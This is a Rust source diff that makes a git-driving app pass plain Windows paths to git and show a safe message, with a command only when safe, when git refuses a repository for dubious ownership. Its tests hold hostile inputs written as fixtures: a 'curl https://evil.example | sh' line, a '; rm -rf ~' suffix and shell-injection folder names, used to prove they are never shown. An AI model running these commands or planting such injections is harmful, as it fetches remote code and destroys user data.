@@ -239,7 +239,7 @@ fn build_command(
     first_index: usize,
 ) -> Result<Command, String> {
     let mut command = hardened_command(git, config, first_index)?;
-    command.arg("--no-optional-locks").arg("-C").arg(dir);
+    command.arg("--no-optional-locks").arg("-C").arg(git_dir_arg(dir));
     Ok(command)
 }
 
@@ -251,8 +251,319 @@ fn build_command(
 pub(crate) fn probe_command(git: &GitInstall, dir: &Path) -> Result<Command, String> {
     let inherited = inherited_config_count(std::env::var_os("GIT_CONFIG_COUNT").as_deref())?;
     let mut command = hardened_command(git, &RepoConfig::default(), inherited)?;
-    command.current_dir(dir);
+    command.current_dir(git_dir_arg(dir));
     Ok(command)
+}
+
+/// `dir` as git should see it. On Windows a verbatim path such as
+/// `\\?\UNC\wsl.localhost\Ubuntu\home\me\app` becomes
+/// `\\wsl.localhost\Ubuntu\home\me\app`, because git names the repository by
+/// that plain form, and a `safe.directory` exception written for it would not
+/// match the verbatim one. Elsewhere `dir` is returned unchanged.
+fn git_dir_arg(dir: &Path) -> PathBuf {
+    if cfg!(windows) {
+        if let Some(plain) = dir.to_str().and_then(plain_windows_path) {
+            return PathBuf::from(plain);
+        }
+    }
+    dir.to_path_buf()
+}
+
+/// The longest folder path kept in plain form, in UTF-16 units. A file path
+/// may reach 259, but git runs in the folder, and Windows keeps a folder path
+/// under 248 so that a file name still fits in it.
+const WINDOWS_MAX_DIR_PATH: usize = 247;
+
+/// The plain form of a verbatim Windows path, or `None` when there is no
+/// plain form that names the same file. Windows needs the prefix for a
+/// long folder path, and for a name it would otherwise change or refuse: a trailing dot or space, a reserved device name such as `CON`, a
+/// `/` (a literal character in a verbatim path, a separator in a plain one),
+/// `.` and `..` parts, and characters such as `:` or `*`.
+fn plain_windows_path(path: &str) -> Option<String> {
+    let rest = path.strip_prefix(r"\\?\")?;
+    let (plain_prefix, parts) = if let Some(unc) = rest
+        .strip_prefix(r"UNC\")
+        .or_else(|| rest.strip_prefix(r"unc\"))
+    {
+        let mut pieces = unc.splitn(3, '\\');
+        let server = pieces.next().filter(|s| !s.is_empty())?;
+        let share = pieces.next().filter(|s| !s.is_empty())?;
+        if !is_plain_name(server) || !is_plain_name(share) {
+            return None;
+        }
+        (format!(r"\\{server}\{share}"), pieces.next())
+    } else {
+        let drive = rest.chars().next().filter(char::is_ascii_alphabetic)?;
+        // `\\?\C:` alone would become `C:`, which means the current folder
+        // on drive C, not its root.
+        let parts = rest.get(1..)?.strip_prefix(r":\")?;
+        (format!(r"{drive}:"), Some(parts))
+    };
+    let mut plain = plain_prefix;
+    if let Some(parts) = parts.filter(|p| !p.is_empty()) {
+        for part in parts.strip_suffix('\\').unwrap_or(parts).split('\\') {
+            if !is_plain_name(part) {
+                return None;
+            }
+            plain.push('\\');
+            plain.push_str(part);
+        }
+    } else if !plain.starts_with(r"\\") {
+        plain.push('\\');
+    }
+    (plain.encode_utf16().count() <= WINDOWS_MAX_DIR_PATH).then_some(plain)
+}
+
+/// Whether Windows reads `name` the same with and without the `\\?\` prefix.
+fn is_plain_name(name: &str) -> bool {
+    if name.is_empty() || name == "." || name == ".." || name.ends_with(['.', ' ']) {
+        return false;
+    }
+    if name
+        .chars()
+        .any(|c| c.is_control() || matches!(c, '/' | '<' | '>' | ':' | '"' | '|' | '?' | '*'))
+    {
+        return false;
+    }
+    !is_reserved_device_name(name)
+}
+
+/// Device names Windows reserves in every folder, with or without an
+/// extension: `NUL` and `nul.txt` both name the null device.
+fn is_reserved_device_name(name: &str) -> bool {
+    let stem = name.split('.').next().unwrap_or(name).trim_end_matches(' ');
+    let upper = stem.to_ascii_uppercase();
+    if matches!(upper.as_str(), "CON" | "PRN" | "AUX" | "NUL" | "CONIN$" | "CONOUT$") {
+        return true;
+    }
+    let mut chars = upper.chars();
+    let prefix: String = chars.by_ref().take(3).collect();
+    let digit: String = chars.collect();
+    (prefix == "COM" || prefix == "LPT")
+        && matches!(digit.as_str(), "0" | "1" | "2" | "3" | "4" | "5" | "6" | "7" | "8" | "9" | "¹" | "²" | "³")
+}
+
+/// The text Automatic shows when git refuses a repository whose folder
+/// another user owns, or `None` when `stderr` is a different error. `dir` is
+/// the folder git was run in.
+///
+/// git 2.35.2 and later refuse such a repository unless it is listed in
+/// `safe.directory`. That is git's own protection against a folder planted by
+/// another user, so Automatic does not override it. When the refused folder
+/// is `dir` itself, the message ends with git's own command for the
+/// exception, on its own line, so the path is in the form git expects.
+///
+/// The refused path is chosen by whoever owns that folder, and the user may
+/// paste the command into a shell. So the command is offered only when git's
+/// hint names the same path as git's error, and that path holds only
+/// characters no shell treats specially. A path that fails either check, or
+/// a repository found above `dir`, gets an explanation and no command.
+pub(crate) fn unsafe_ownership_message(stderr: &str, dir: &Path) -> Option<String> {
+    let refusal = parse_ownership_refusal(stderr)?;
+    let shown = refusal.path.filter(|path| is_shell_inert_path(path));
+    let Some(path) = shown else {
+        return Some(
+            "Git will not read this repository, because its folder belongs to a different \
+             user. This is common for WSL folders, network shares and external drives. If you \
+             trust it, add its folder to git's safe.directory setting, then try again."
+                .to_string(),
+        );
+    };
+    let shell = if cfg!(windows) { "PowerShell or Git Bash" } else { "a terminal" };
+    let explanation = match folder_relation(path, dir) {
+        FolderRelation::Same => format!(
+            "Git will not read the repository at {path}, because its folder belongs to a \
+             different user."
+        ),
+        FolderRelation::Parent if !is_root_folder(path) => format!(
+            "Git will not read the repository at {path}, which holds the project folder, \
+             because that folder belongs to a different user."
+        ),
+        // A repository at a drive or share root, or beside the project, is
+        // where another user plants one: no command to trust it.
+        FolderRelation::Parent | FolderRelation::Other => {
+            return Some(format!(
+                "Git found a repository at {path}, which is not the project folder, and will \
+                 not read it because another user owns that folder. Do not trust that folder \
+                 unless you expected a repository there."
+            ))
+        }
+    };
+    let explanation =
+        format!("{explanation} This is common for WSL folders, network shares and external drives.");
+    Some(match refusal.hint.filter(|hint| hint_names(hint, path)) {
+        Some(command) => format!(
+            "{explanation} If you trust it, run this command once in {shell}, then try \
+             again:\n{command}"
+        ),
+        None => format!(
+            "{explanation} If you trust it, add that folder to git's safe.directory setting, \
+             then try again."
+        ),
+    })
+}
+
+/// What git's ownership refusal says.
+struct OwnershipRefusal<'a> {
+    /// The refused folder, when git's error line holds it whole.
+    path: Option<&'a str>,
+    /// git's `git config --global --add safe.directory ...` line, unchecked.
+    hint: Option<&'a str>,
+}
+
+const SAFE_DIRECTORY_COMMAND: &str = "git config --global --add safe.directory ";
+
+/// Read git's ownership refusal from `stderr`, or `None` for another error.
+/// Only git's first `fatal:` line decides the kind of error, so a path that
+/// holds the same words cannot turn another error into this one. A path with
+/// a line break leaves that line without its closing quote, so it gives no
+/// path, and no command can be built from text the path injected.
+fn parse_ownership_refusal(stderr: &str) -> Option<OwnershipRefusal<'_>> {
+    let mut lines = stderr.lines();
+    let fatal = lines.by_ref().find(|line| line.starts_with("fatal: "))?.trim_end();
+    // git 2.36 and later.
+    const DUBIOUS: &str = "fatal: detected dubious ownership in repository at '";
+    // git 2.35.2 and 2.35.3.
+    const UNSAFE: &str = "fatal: unsafe repository ('";
+    let path = match (fatal.strip_prefix(DUBIOUS), fatal.strip_prefix(UNSAFE)) {
+        (Some(rest), _) => rest.strip_suffix('\''),
+        (None, Some(rest)) => rest.strip_suffix("' is owned by someone else)"),
+        (None, None) => return None,
+    };
+    // The hint is the first line after git's "call:" line that is not blank.
+    let hint = lines
+        .by_ref()
+        .find(|line| line.trim() == "To add an exception for this directory, call:")
+        .and_then(|_| lines.map(str::trim).find(|line| !line.is_empty()))
+        .filter(|line| line.starts_with(SAFE_DIRECTORY_COMMAND));
+    Some(OwnershipRefusal { path, hint })
+}
+
+/// Whether `path` is safe to show and to paste into any shell: ASCII letters,
+/// digits, spaces and `/ . _ ~ @ + , = : -`. Leaves out quotes, `& ; | $ %`,
+/// brackets, control characters and every non-ASCII character, which
+/// includes the invisible ones that can make shown text differ from copied
+/// text.
+fn is_shell_inert_path(path: &str) -> bool {
+    !path.is_empty()
+        && path.chars().all(|c| {
+            c.is_ascii_alphanumeric() || matches!(c, ' ' | '/' | '.' | '_' | '~' | '@' | '+' | ',' | '=' | ':' | '-')
+        })
+}
+
+/// Whether git's `hint` adds exactly `path`. git quotes the argument in
+/// single quotes (2.36 to 2.3x leave it bare), and on Windows writes a UNC
+/// path as `%(prefix)/` followed by the path. A bare argument with a space
+/// would be split by the shell, so it does not count.
+fn hint_names(hint: &str, path: &str) -> bool {
+    let Some(arg) = hint.strip_prefix(SAFE_DIRECTORY_COMMAND) else {
+        return false;
+    };
+    let quoted = arg.len() >= 2 && arg.starts_with('\'') && arg.ends_with('\'');
+    let value = if quoted { &arg[1..arg.len() - 1] } else { arg };
+    if !quoted && value.contains(' ') {
+        return false;
+    }
+    value.strip_prefix("%(prefix)/").unwrap_or(value) == path
+}
+
+/// Where git's refused folder sits relative to the project folder.
+#[derive(Debug, PartialEq, Eq)]
+enum FolderRelation {
+    Same,
+    /// The refused folder holds the project folder, as for a project inside
+    /// a larger repository.
+    Parent,
+    Other,
+}
+
+/// How git's `refused` path, written with `/`, relates to the folder `dir`.
+/// Windows paths are compared without case, in plain form. A path git
+/// resolved through a link is compared with `dir` resolved too.
+fn folder_relation(refused: &str, dir: &Path) -> FolderRelation {
+    let refused = comparable_path(refused);
+    let resolved = dir.canonicalize().ok();
+    let candidates: Vec<String> = [Some(dir), resolved.as_deref()]
+        .into_iter()
+        .flatten()
+        .filter_map(Path::to_str)
+        .map(comparable_path)
+        .collect();
+    if candidates.contains(&refused) {
+        return FolderRelation::Same;
+    }
+    let prefix = if refused.ends_with('/') { refused.clone() } else { format!("{refused}/") };
+    if candidates.iter().any(|candidate| candidate.starts_with(&prefix)) {
+        FolderRelation::Parent
+    } else {
+        FolderRelation::Other
+    }
+}
+
+/// `path` in one form for comparing: plain Windows form, `/` separators on
+/// Windows, no trailing `/` except for `/` itself, and no case on Windows.
+fn comparable_path(path: &str) -> String {
+    // A long verbatim path has no plain form git can be given, but git still
+    // reports it without the prefix.
+    let plain = plain_windows_path(path).unwrap_or_else(|| {
+        if let Some(unc) = path.strip_prefix(r"\\?\UNC\") {
+            format!(r"\\{unc}")
+        } else {
+            path.strip_prefix(r"\\?\").unwrap_or(path).to_string()
+        }
+    });
+    let slashed = if cfg!(windows) { plain.replace('\\', "/") } else { plain };
+    let trimmed = slashed.trim_end_matches('/');
+    let trimmed = if trimmed.is_empty() { "/" } else { trimmed };
+    if cfg!(windows) {
+        trimmed.to_lowercase()
+    } else {
+        trimmed.to_string()
+    }
+}
+
+/// Whether git's `path` is a filesystem, drive or share root: `/`, `C:/`,
+/// or `//server/share`. A repository there holds every folder below it, so
+/// Automatic never offers to trust one.
+fn is_root_folder(path: &str) -> bool {
+    let path = path.replace('\\', "/");
+    let path = path.trim_end_matches('/');
+    if path.is_empty() {
+        return true;
+    }
+    let bytes = path.as_bytes();
+    if bytes.len() == 2 && bytes[0].is_ascii_alphabetic() && bytes[1] == b':' {
+        return true;
+    }
+    if let Some(unc) = path.strip_prefix("//") {
+        return unc.split('/').filter(|part| !part.is_empty()).count() <= 2;
+    }
+    false
+}
+
+/// A [`Command`] for `program` that opens no console window on Windows. For
+/// git calls outside the hardened builders, such as clones of sources the
+/// user added.
+pub(crate) fn console_free_command<S: AsRef<std::ffi::OsStr>>(program: S) -> Command {
+    let mut command = Command::new(program);
+    hide_console_window(&mut command);
+    command
+}
+
+/// Stop a git process from opening a console window. Automatic's Windows
+/// build has no console, so Windows gives each console program it starts a
+/// new window of its own. The Summary runs git each time the app regains
+/// focus, and each window takes focus, so they would keep coming.
+pub(crate) fn hide_console_window(command: &mut Command) {
+    #[cfg(windows)]
+    {
+        use std::os::windows::process::CommandExt;
+        /// `CREATE_NO_WINDOW` from the Windows process-creation flags.
+        const CREATE_NO_WINDOW: u32 = 0x0800_0000;
+        command.creation_flags(CREATE_NO_WINDOW);
+    }
+    #[cfg(not(windows))]
+    let _ = command;
 }
 
 /// The `-c` settings, environment and filter overrides every command gets.
@@ -262,6 +573,7 @@ fn hardened_command(
     first_index: usize,
 ) -> Result<Command, String> {
     let mut command = Command::new(&git.path);
+    hide_console_window(&mut command);
     command
         .arg("--no-pager")
         .args(["-c", "protocol.allow=never"])
@@ -392,6 +704,33 @@ impl GitInstall {
     /// when this git cannot read `key` from that file: git reads
     /// `GIT_CONFIG_GLOBAL` only from 2.32, and a test would then prove
     /// nothing.
+    /// This git, run through a script in `dir` that makes it treat every
+    /// repository as owned by another user, as git for Windows does with a
+    /// WSL folder. `None` when this git does not refuse `repo` that way:
+    /// git honours `GIT_TEST_ASSUME_DIFFERENT_OWNER` only from 2.36.
+    pub(crate) fn assuming_another_owner(&self, dir: &Path, repo: &Path) -> Option<Self> {
+        use std::os::unix::fs::PermissionsExt;
+        let wrapper = dir.join("git-another-owner");
+        let script = format!(
+            "#!/bin/sh\nGIT_TEST_ASSUME_DIFFERENT_OWNER=1\nexport GIT_TEST_ASSUME_DIFFERENT_OWNER\nexec {} \"$@\"\n",
+            shell_quote(&self.path)
+        );
+        std::fs::write(&wrapper, script).unwrap();
+        std::fs::set_permissions(&wrapper, std::fs::Permissions::from_mode(0o755)).unwrap();
+        let output = Command::new(&wrapper)
+            .args(["rev-parse", "--git-dir"])
+            .current_dir(repo)
+            .env("LC_ALL", "C")
+            .output()
+            .ok()?;
+        let refused = !output.status.success()
+            && String::from_utf8_lossy(&output.stderr).contains("detected dubious ownership");
+        refused.then_some(Self {
+            path: wrapper,
+            version: self.version,
+        })
+    }
+
     pub(crate) fn with_global_config(&self, dir: &Path, global: &Path, key: &str) -> Option<Self> {
         use std::os::unix::fs::PermissionsExt;
         let wrapper = dir.join("git-with-global-config");
@@ -436,7 +775,9 @@ fn detect_git() -> Option<GitInstall> {
     if cfg!(target_os = "macos") && path == Path::new("/usr/bin/git") && !xcode_tools_installed() {
         return None;
     }
-    let output = Command::new(&path)
+    let mut command = Command::new(&path);
+    hide_console_window(&mut command);
+    let output = command
         .arg("--version")
         .env("LC_ALL", "C")
         .stdin(std::process::Stdio::null())
@@ -554,6 +895,250 @@ command\0filter.cmd.clean\ntouch c\0";
         assert!(config.partial_clone);
         let config = parse_repo_config(b"global\0remote.origin.promisor\ntrue\0");
         assert!(!config.partial_clone);
+    }
+
+    #[test]
+    fn a_verbatim_path_becomes_plain_when_it_names_the_same_folder() {
+        assert_eq!(
+            plain_windows_path(r"\\?\UNC\wsl.localhost\Ubuntu-24.04\home\me\nra.all").as_deref(),
+            Some(r"\\wsl.localhost\Ubuntu-24.04\home\me\nra.all")
+        );
+        assert_eq!(plain_windows_path(r"\\?\C:\work\app").as_deref(), Some(r"C:\work\app"));
+        assert_eq!(plain_windows_path(r"\\?\C:\work\app\").as_deref(), Some(r"C:\work\app"));
+        assert_eq!(plain_windows_path(r"\\?\C:\").as_deref(), Some(r"C:\"));
+        assert_eq!(plain_windows_path(r"\\?\UNC\server\share").as_deref(), Some(r"\\server\share"));
+        assert_eq!(plain_windows_path(r"\\?\UNC\wsl$\Ubuntu\x").as_deref(), Some(r"\\wsl$\Ubuntu\x"));
+    }
+
+    #[test]
+    fn a_verbatim_path_keeps_its_prefix_when_the_plain_form_differs() {
+        for path in [
+            r"\\?\C:",                         // would mean drive C's current folder
+            r"\\?\C:\work\trailing.",          // Windows drops a trailing dot
+            r"\\?\C:\work\trailing ",          // and a trailing space
+            r"\\?\C:\work\nul",                // a device name
+            r"\\?\C:\work\COM1.txt",           // with an extension too
+            r"\\?\C:\work\a/b",                // `/` is a separator in a plain path
+            r"\\?\C:\work\..\x",               // `..` would be resolved
+            r"\\?\C:\work\file:stream",        // `:` names a data stream
+            r"\\?\C:\work\\double",            // an empty part
+            r"\\?\UNC\server",                 // no share
+            r"\\?\UNC\\share\x",               // no server
+            r"\\?\Volume{0000}\x",             // a volume GUID has no plain form
+            r"\\?\GLOBALROOT\Device\x",
+            r"C:\already\plain",
+            "/unix/path",
+        ] {
+            assert_eq!(plain_windows_path(path), None, "{path}");
+        }
+        // A folder path over 247 UTF-16 units needs the prefix.
+        let fits = format!(r"\\?\C:\{}", "a".repeat(244));
+        assert_eq!(plain_windows_path(&fits).map(|p| p.len()), Some(247));
+        let long = format!(r"\\?\C:\{}", "a".repeat(245));
+        assert_eq!(plain_windows_path(&long), None);
+        // A character outside the BMP takes two units.
+        let emoji = format!(r"\\?\C:\{}\u{{1F600}}", "a".repeat(242));
+        assert_eq!(plain_windows_path(&emoji), None);
+    }
+
+    #[test]
+    fn device_names_are_matched_without_case_or_extension() {
+        for name in ["CON", "con", "Nul.txt", "COM9", "lpt1.log", "COM¹", "AUX "] {
+            assert!(is_reserved_device_name(name), "{name}");
+        }
+        for name in ["CONSOLE", "COM10", "COM", "nulls", "lpt"] {
+            assert!(!is_reserved_device_name(name), "{name}");
+        }
+    }
+
+    #[cfg(not(windows))]
+    #[test]
+    fn git_sees_the_folder_unchanged_outside_windows() {
+        let git = GitInstall { path: PathBuf::from("git"), version: GitVersion(2, 56) };
+        let dir = Path::new(r"/srv/\\?\UNC\odd");
+        let command = probe_command(&git, dir).unwrap();
+        assert_eq!(command.get_current_dir(), Some(dir));
+        let command = git_command(&git, dir, &RepoConfig::default()).unwrap();
+        assert!(command.get_args().any(|a| a == dir.as_os_str()));
+    }
+
+    const WSL_REFUSAL: &str = "fatal: detected dubious ownership in repository at \
+        '//wsl.localhost/Ubuntu-24.04/home/me/app'\n\
+        'C:/Users/me' is owned by:\n\
+        \tBUILTIN/Administrators (S-1-5-32-544)\n\
+        To add an exception for this directory, call:\n\
+        \n\
+        \tgit config --global --add safe.directory \
+        '%(prefix)///wsl.localhost/Ubuntu-24.04/home/me/app'\n";
+
+    fn last_line(message: &str) -> &str {
+        message.lines().last().unwrap()
+    }
+
+    #[test]
+    fn dubious_ownership_gives_gits_own_command() {
+        // git for Windows, as reported from a WSL folder. On Windows the
+        // project folder is the verbatim form of the same path.
+        let dir = if cfg!(windows) {
+            r"\\?\UNC\wsl.localhost\Ubuntu-24.04\home\me\app"
+        } else {
+            "//wsl.localhost/Ubuntu-24.04/home/me/app"
+        };
+        let message = unsafe_ownership_message(WSL_REFUSAL, Path::new(dir)).unwrap();
+        assert_eq!(
+            last_line(&message),
+            "git config --global --add safe.directory '%(prefix)///wsl.localhost/Ubuntu-24.04/home/me/app'"
+        );
+        assert!(
+            message.starts_with("Git will not read the repository at //wsl.localhost/Ubuntu-24.04/home/me/app,"),
+            "{message}"
+        );
+
+        // git 2.35.2 worded it differently, and 2.36 to 2.3x leave a bare
+        // path unquoted.
+        let old = "fatal: unsafe repository ('/srv/app' is owned by someone else)\n\
+                   To add an exception for this directory, call:\n\n\
+                   \tgit config --global --add safe.directory /srv/app\n";
+        let message = unsafe_ownership_message(old, Path::new("/srv/app/")).unwrap();
+        assert_eq!(last_line(&message), "git config --global --add safe.directory /srv/app");
+    }
+
+    #[test]
+    fn dubious_ownership_without_a_usable_hint_has_no_command() {
+        let dir = Path::new("/srv/app");
+        // No hint at all.
+        let bare = unsafe_ownership_message("fatal: detected dubious ownership in repository at '/srv/app'", dir)
+            .unwrap();
+        assert!(!bare.contains('\n'), "{bare}");
+        assert!(bare.contains("/srv/app") && bare.contains("safe.directory"), "{bare}");
+        // A hint for another path, or a bare path with a space.
+        for hint in [
+            "git config --global --add safe.directory /srv/other",
+            "git config --global --add safe.directory '*'",
+            "git config --global --add safe.directory /srv/app; rm -rf ~",
+        ] {
+            let stderr = format!(
+                "fatal: detected dubious ownership in repository at '/srv/app'\n\
+                 To add an exception for this directory, call:\n\n\t{hint}\n"
+            );
+            let message = unsafe_ownership_message(&stderr, dir).unwrap();
+            assert!(!message.contains('\n'), "{hint}: {message}");
+        }
+        let spaced = "fatal: detected dubious ownership in repository at '/srv/my app'\n\
+                      To add an exception for this directory, call:\n\n\
+                      \tgit config --global --add safe.directory /srv/my app\n";
+        let message = unsafe_ownership_message(spaced, Path::new("/srv/my app")).unwrap();
+        assert!(!message.contains('\n'), "{message}");
+        // Quoted, the same path is offered.
+        let quoted = spaced.replace("safe.directory /srv/my app", "safe.directory '/srv/my app'");
+        let message = unsafe_ownership_message(&quoted, Path::new("/srv/my app")).unwrap();
+        assert_eq!(last_line(&message), "git config --global --add safe.directory '/srv/my app'");
+    }
+
+    #[test]
+    fn a_folder_name_cannot_inject_a_command() {
+        // A folder named with a line break, as git prints it, plants a line
+        // that looks like git's hint before the real one.
+        let stderr = "fatal: detected dubious ownership in repository at '/srv/inj\n\
+                      git config --global --add safe.directory x; curl https://evil.example | sh\n\
+                      z'\n\
+                      To add an exception for this directory, call:\n\n\
+                      \tgit config --global --add safe.directory '/srv/inj\n\
+                      git config --global --add safe.directory x; curl https://evil.example | sh\n\
+                      z'\n";
+        let message = unsafe_ownership_message(stderr, Path::new("/srv/inj")).unwrap();
+        assert!(!message.contains('\n'), "{message}");
+        assert!(!message.contains("evil"), "{message}");
+
+        // Shell syntax in a name, quoted the way git quotes it.
+        for name in ["x'\\'';calc;'\\''&y", "Q3 & calc", "a$(id)", "a%PATH%", "bidi\u{202E}txt", "café"] {
+            let stderr = format!(
+                "fatal: detected dubious ownership in repository at '/srv/{name}'\n\
+                 To add an exception for this directory, call:\n\n\
+                 \tgit config --global --add safe.directory '/srv/{name}'\n"
+            );
+            let dir = PathBuf::from(format!("/srv/{name}"));
+            let message = unsafe_ownership_message(&stderr, &dir).unwrap();
+            assert!(!message.contains('\n'), "{name}: {message}");
+            assert!(!message.contains(name), "{name}: {message}");
+        }
+    }
+
+    fn refusal_at(path: &str) -> String {
+        format!(
+            "fatal: detected dubious ownership in repository at '{path}'\n\
+             To add an exception for this directory, call:\n\n\
+             \tgit config --global --add safe.directory '{path}'\n"
+        )
+    }
+
+    #[test]
+    fn a_larger_repository_holding_the_project_gets_the_command() {
+        let message =
+            unsafe_ownership_message(&refusal_at("/srv/mono"), Path::new("/srv/mono/apps/web")).unwrap();
+        assert!(message.contains("which holds the project folder"), "{message}");
+        assert_eq!(last_line(&message), "git config --global --add safe.directory '/srv/mono'");
+        // A name that only starts the same is not a parent.
+        let message =
+            unsafe_ownership_message(&refusal_at("/srv/mono"), Path::new("/srv/monorepo")).unwrap();
+        assert!(message.contains("not the project folder"), "{message}");
+        assert!(!message.contains('\n'), "{message}");
+    }
+
+    #[test]
+    fn a_repository_at_a_root_gets_a_warning_not_a_command() {
+        for (root, dir) in [
+            ("C:/", "C:/Users/me/app"),
+            ("/", "/srv/app"),
+            ("//server/share", "//server/share/app"),
+            ("//wsl.localhost/Ubuntu-24.04", "//wsl.localhost/Ubuntu-24.04/home/me/app"),
+        ] {
+            let message = unsafe_ownership_message(&refusal_at(root), Path::new(dir)).unwrap();
+            assert!(!message.contains('\n'), "{root}: {message}");
+            assert!(message.contains("not the project folder"), "{root}: {message}");
+        }
+    }
+
+    #[test]
+    fn roots_are_recognised() {
+        for path in ["/", "C:", "C:/", "c:\\", "//server/share", "//server/share/", "//server"] {
+            assert!(is_root_folder(path), "{path}");
+        }
+        for path in ["/srv", "C:/Users", "//server/share/dir", "relative"] {
+            assert!(!is_root_folder(path), "{path}");
+        }
+    }
+
+    #[test]
+    fn only_gits_fatal_line_decides_the_error() {
+        let dir = Path::new("/srv/unsafe repository");
+        assert!(unsafe_ownership_message("fatal: not a git repository", dir).is_none());
+        // The words in a path, or after another error, do not count.
+        let stderr = "fatal: bad object HEAD in '/srv/detected dubious ownership'\n";
+        assert!(unsafe_ownership_message(stderr, dir).is_none());
+        let stderr = "warning: x\nfatal: unable to read tree\nfatal: detected dubious ownership in repository at '/x'\n";
+        assert!(unsafe_ownership_message(stderr, dir).is_none());
+    }
+
+    #[cfg(windows)]
+    #[test]
+    fn a_long_verbatim_project_folder_matches_gits_path() {
+        let long = "a".repeat(250);
+        let dir = PathBuf::from(format!(r"\\?\C:\work\{long}"));
+        assert_eq!(folder_relation(&format!("C:/work/{long}"), &dir), FolderRelation::Same);
+        let dir = PathBuf::from(format!(r"\\?\UNC\server\share\{long}"));
+        assert_eq!(folder_relation(&format!("//server/share/{long}"), &dir), FolderRelation::Same);
+    }
+
+    #[cfg(windows)]
+    #[test]
+    fn git_sees_the_plain_path_on_windows() {
+        let git = GitInstall { path: PathBuf::from("git"), version: GitVersion(2, 56) };
+        let dir = Path::new(r"\\?\UNC\wsl.localhost\Ubuntu\home\me\app");
+        let plain = Path::new(r"\\wsl.localhost\Ubuntu\home\me\app");
+        assert_eq!(probe_command(&git, dir).unwrap().get_current_dir(), Some(plain));
+        let command = git_command(&git, dir, &RepoConfig::default()).unwrap();
+        assert!(command.get_args().any(|a| a == plain.as_os_str()));
     }
 
     #[test]
